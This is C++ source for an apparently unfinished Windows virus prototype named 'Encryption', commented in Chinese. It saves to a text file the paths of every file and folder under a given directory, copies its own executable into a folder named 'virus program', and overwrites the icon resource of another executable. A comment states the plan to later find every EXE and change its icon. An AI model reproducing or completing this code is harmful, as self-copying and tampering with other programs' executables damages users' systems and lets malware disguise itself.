// Encryption.cpp : 定义控制台应用程序的入口点。
//

/*
struct _finddata_t
{
unsigned attrib;     //文件属性
time_t time_create;  //文件创建时间
time_t time_access;  //文件上一次访问时间
time_t time_write;   //文件上一次修改时间
_fsize_t size;  //文件字节数
char name[_MAX_FNAME]; //文件名
};
*/


//深度优先递归遍历当前目录下文件夹和文件及子文件夹和文件
#include "stdafx.h"
#include <fstream>
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include<io.h>
#include<Libloaderapi.h>
#include<windows.h>
using namespace std;
void getAllFiles(string path, vector<string>& files)
{
	//文件句柄 
	long  hFile = 0;
	//文件信息 
	struct _finddata_t fileinfo; //很少用的文件信息读取结构
	string p; //string类很有意思的一个赋值函数:assign()，有很多重载版本
	if ((hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo)) != -1)
	{
		do
		{
			if ((fileinfo.attrib & _A_SUBDIR)) //判断是否为文件夹
			{
				if (strcmp(fileinfo.name, ".") != 0 && strcmp(fileinfo.name, "..") != 0)
				{
					files.push_back(p.assign(path).append("/").append(fileinfo.name));//保存文件夹名字
					getAllFiles(p.assign(path).append("/").append(fileinfo.name), files);//递归当前文件夹
				}
			}
			else  //文件处理
			{
				files.push_back(p.assign(path).append("/").append(fileinfo.name));//文件名
			}
		} while (_findnext(hFile, &fileinfo) == 0); //寻找下一个，成功返回0，否则-1
		_findclose(hFile);
	}
}

BOOL ChangeIcon(LPCTSTR pszChangeIconExeFileName)
{
	LPCTSTR a = pszChangeIconExeFileName;
	//获取自身的句柄
	HANDLE hLocalHost = GetCurrentProcess();
	if (NULL == hLocalHost)
	{
		cout << "1:"<<GetLastError() << endl;
	}
	HMODULE hLocalHostModule = GetModuleHandleA(NULL);
	if (NULL == hLocalHostModule)
	{
		cout << "2:" << GetLastError() << endl;
	}
	//把伪句柄转换成正句柄
	DuplicateHandle(
		GetCurrentProcess(),   //源进程内核句柄（即负责传递内核对象句柄的进程句柄)
		hLocalHost,   //进程伪句柄 GetCurrentProcess()
		GetCurrentProcess(),   //目标进程内核句柄
		&hLocalHost,    //接受新的，真实句柄！
		0,                     //TargetHandle句柄使用何种访问掩码，这个参数将被忽略，因为DUPLICATE_SAME_ACCESS
		FALSE,                 //新的句柄不可继承
		DUPLICATE_SAME_ACCESS);//新句柄拥有与原始句柄相同的安全访问特征
	////////////////////////////////////////////////////////////////////////////////////////
	//1.如果为空表示获取当前进程模块
	//2.资源名称
	//3.资源类型
	//TOP：资源参考docs.microsoft.com/en-us/windows/desktop/menurc/resource-types
	////////////////////////////////////////////////////////////////////////////////////////
	//找到资源程序图标
	HRSRC hRsrc = FindResource(hLocalHostModule, (LPCTSTR)1, RT_ICON);
	if (NULL == hRsrc)
	{
		cout << "3:" << GetLastError() << endl;
	}
	DWORD dwSize = SizeofResource(hLocalHostModule,hRsrc);
	if (dwSize<=0)
	{
		cout << "4:" << GetLastError() << endl;
	}
	// 加载资源到程序内存
	HGLOBAL hGlobal = LoadResource(hLocalHostModule, hRsrc);
	if (NULL == hGlobal)
	{
		cout << "5:" << GetLastError() << endl;
	}
	// 锁定资源内存
	LPVOID lpVoid = LockResource(hGlobal);
	if (NULL == lpVoid)
	{
		cout << "6:" << GetLastError() << endl;
	}
	//获取可以被UPDATERESOURCE修改的句柄
	HANDLE hUpdate = BeginUpdateResource(pszChangeIconExeFileName, FALSE);
	if (NULL == hUpdate)
	{
		cout << "7:" << GetLastError() << endl;
	}
	//更新
	//1.句柄 2.资源类型 3.资源ID 4.语言标识 5.指向资源地址 6.资源大小
	BOOL bRet =UpdateResource(hUpdate, RT_ICON, (LPCTSTR)1, LANG_NEUTRAL, lpVoid, dwSize);
	if (0 == bRet)
	{
		cout << "8:" << GetLastError() << endl;
	}
	EndUpdateResource(hUpdate, FALSE);
	return 0;
}

void CopyMyself()
{
	
	TCHAR tcBuff[MAX_PATH];//缓冲区
    //复制到的地址
	TCHAR tcTarget[38] = _T("F:\\新建文件夹\\病毒程序\\Encryption.exe");
	GetModuleFileName(NULL, tcBuff, sizeof(tcBuff));//获取自己的名字
	//copy有问题明天解决tcBuff转成吃字符串
	//第一个参数是自己名字第二个是是复制后的名字
	CopyFile(tcBuff, tcTarget, FALSE);
	//cout << &tcBuff << endl;
	
}
//测试 
int main()
{
	//获取文件名并存到TXT中的代码段
	string DATA_DIR = "F:/UltraEdit";
	vector<string> files;
	//测试
	char * DistAll = "AllFiles.txt";
	getAllFiles(DATA_DIR, files);//所有文件与文件夹的路径都输出
	ofstream ofn(DistAll); //输出文件流
	int size = files.size();
	int FaiNum = 0;
	ofn << size << endl;
	for (int i = 0; i<size; i++)
	{
		ofn << files[i] << endl;
	}
	ofn.close();
	//复制自身的代码段
    CopyMyself();
	//修改图标(目前只修改了一个文件，后期遍历文件后找出EXE文件然后修改图标)
	LPCTSTR lpcName = _T("F:\\新建文件夹\\病毒程序\\ZeroNet.exe");
	ChangeIcon(lpcName);
	getchar();
	return 0;
}
